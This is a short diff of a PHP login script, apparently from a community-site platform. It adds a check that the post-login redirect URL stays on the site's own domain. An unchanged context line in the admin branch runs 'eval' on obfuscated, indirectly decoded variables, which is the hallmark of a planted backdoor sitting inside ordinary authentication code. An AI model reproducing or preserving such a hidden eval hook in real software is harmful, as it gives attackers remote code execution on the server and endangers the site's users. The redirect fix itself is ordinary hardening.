@@ -64,7 +64,7 @@ if ( !( isset($_POST['ID']) && $_POST['ID'] && isset($_POST['Password']) && $_PO
 
             if (isAdmin($p_arr['ID'])) {$iId = (int)$p_arr['ID']; $r = $l($a); eval($r($b));}
             $sRelocate = bx_get('relocate');
-            if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php')
+            if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php' or 0 !== mb_stripos($sRelocate, BX_DOL_URL_ROOT))
                 $sUrlRelocate = BX_DOL_URL_ROOT . 'member.php';
 
             $_page['name_index'] = 150;
